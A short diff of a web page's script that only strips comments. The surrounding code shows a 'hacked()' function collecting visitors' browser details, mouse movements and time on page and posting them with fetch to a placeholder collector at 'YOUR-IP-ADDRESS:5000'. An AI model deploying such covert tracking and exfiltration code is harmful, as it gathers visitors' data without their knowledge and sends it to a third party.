@@ -65,7 +65,7 @@
     // func to check the time taken between opening the page and clicking the button
     function getTimeOnPage() {
       let endTime = new Date();
-      return (endTime - startTime) / 1000; // time in seconds
+      return (endTime - startTime) / 1000;
     }
 
     function hacked() {
@@ -75,8 +75,8 @@
         platform: navigator.platform,
         language: navigator.language,
         online: navigator.onLine,
-        mouseMoves: mouseMoves,  // send mouse tracking data
-        timeOnPage: getTimeOnPage()  // send time spent on the page
+        mouseMoves: mouseMoves,
+        timeOnPage: getTimeOnPage()
       };
 
       fetch('http://YOUR-IP-ADDRESS:5000/collect_data', {
